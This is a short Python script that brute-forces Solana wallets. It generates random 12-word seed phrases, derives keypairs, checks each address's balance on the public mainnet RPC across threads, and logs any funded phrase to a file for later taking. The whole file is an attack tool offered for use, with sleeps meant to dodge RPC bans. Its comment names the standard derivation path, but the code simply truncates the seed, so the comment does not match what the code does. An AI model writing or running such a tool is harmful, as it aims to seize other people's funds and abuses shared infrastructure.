import threading
import time
from mnemonic import Mnemonic
from solana.rpc.api import Client
from solders.keypair import Keypair
from hashlib import pbkdf2_hmac
import hmac
import hashlib

# Configuration
RPC_URL = "https://api.mainnet-beta.solana.com"
client = Client(RPC_URL)
mnemo = Mnemonic("english")
stats = {"checked": 0, "found": 0, "last_address": "None"}

def derive_solana_keypair(mnemonic_phrase):
    # Standard Solana derivation path m/44'/501'/0'/0'
    seed = mnemo.to_seed(mnemonic_phrase)
    # Simple derivation for demo (first account)
    return Keypair.from_seed(seed[:32])

def brute_force():
    global stats
    while True:
        try:
            # Correct way to generate 12 words
            phrase = mnemo.generate(strength=128)
            kp = derive_solana_keypair(phrase)
            pubkey = kp.pubkey()
            
            # Check Balance
            response = client.get_balance(pubkey)
            balance = response.value
            
            stats["checked"] += 1
            stats["last_address"] = str(pubkey)
            
            if balance > 0:
                stats["found"] += 1
                with open("found.txt", "a") as f:
                    f.write(f"Phrase: {phrase} | Addr: {pubkey} | SOL: {balance/10**9}\n")
            
            # Small sleep to prevent instant IP ban from Public RPC
            time.sleep(0.1) 
        except Exception as e:
            time.sleep(2)

def start_threads(count=4):
    for _ in range(count):
        t = threading.Thread(target=brute_force, daemon=True)
        t.start()
